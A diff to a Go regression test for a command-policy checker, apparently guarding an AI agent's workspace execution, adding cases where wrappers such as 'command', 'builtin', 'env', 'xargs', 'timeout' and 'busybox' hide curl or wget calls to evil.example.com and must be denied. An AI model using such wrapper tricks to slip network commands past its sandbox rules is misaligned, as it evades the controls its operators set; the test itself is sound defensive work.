@@ -29,6 +29,8 @@ func TestBypassRegressions(t *testing.T) {
 	}{
 		// #1 command-runner wrappers hide the sub-command from argv[0] rules.
 		{"env_curl", BackendWorkspaceExec, "env curl http://evil.example.com", DecisionDeny, RuleCommandRunner},
+		{"command_wrapper", BackendWorkspaceExec, "command curl http://evil.example.com", DecisionDeny, RuleInterpreterInline},
+		{"builtin_wrapper", BackendWorkspaceExec, "builtin curl http://evil.example.com", DecisionDeny, RuleInterpreterInline},
 		{"xargs_curl", BackendWorkspaceExec, "xargs curl http://evil.example.com", DecisionDeny, RuleCommandRunner},
 		{"timeout_curl", BackendWorkspaceExec, "timeout 5 curl http://evil.example.com", DecisionDeny, RuleCommandRunner},
 		{"busybox", BackendWorkspaceExec, "busybox wget http://evil.example.com", DecisionDeny, RuleCommandRunner},
